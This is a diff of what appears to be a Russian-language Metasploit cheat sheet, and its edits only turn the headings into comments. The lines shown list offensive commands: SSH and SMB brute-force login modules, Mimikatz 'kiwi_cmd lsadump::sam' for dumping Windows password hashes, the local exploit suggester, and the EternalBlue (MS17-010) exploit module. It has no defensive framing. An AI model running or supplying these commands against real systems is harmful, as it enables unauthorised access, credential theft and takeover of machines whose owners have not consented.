@@ -100,12 +100,14 @@ set filename Test3.pdf
 Здесь задаём имя нашему файлу
 
 
-Для брута use auxiliary/scanner/ssh/ssh_login
+# Для брута 
+use auxiliary/scanner/ssh/ssh_login
 
 use auxiliary/scanner/smb/smb_login
 set rhost
 set 
-МИМИКАТЗ в метасплойт
+
+# МИМИКАТЗ в метасплойт
 
 kiwi_cmd lsadump::sam
 
@@ -116,7 +118,7 @@ kiwi_cmd lsadump::sam
 run post/multi/recon/local_exploit_suggester
 
 
-eternalblue в метасплойт
+# eternalblue в метасплойт
 
 use exploit/windows/smb/ms17_010_eternalblue
    show payloads
